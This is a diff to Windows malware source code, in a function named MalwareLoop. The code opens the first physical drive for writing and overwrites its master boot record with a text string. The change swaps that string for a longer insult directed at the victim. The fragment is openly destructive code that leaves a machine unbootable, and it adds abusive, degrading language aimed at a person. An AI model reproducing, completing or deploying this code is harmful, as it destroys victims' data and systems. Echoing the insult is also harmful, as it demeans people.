@@ -41,7 +41,8 @@ VOID MalwareLoop(){
     HANDLE hMasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0", 
                                 GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                 NULL, OPEN_EXISTING, 0, 0);
-    WriteFile(hMasterBootRecord, "I told you so", 512, NULL, NULL);
+    WriteFile(hMasterBootRecord, "I told you so, you are nothing but a worthless pest, and no you aren't superior to ANYONE, your IQ did NOTHING to make you a worthful human", 
+            512, NULL, NULL);
     HBRUSH red = CreateSolidBrush(RGB(100, 0, 0));
     HBRUSH green = CreateSolidBrush(RGB(0, 100, 0));
     HBRUSH blue = CreateSolidBrush(RGB(0, 0, 100));
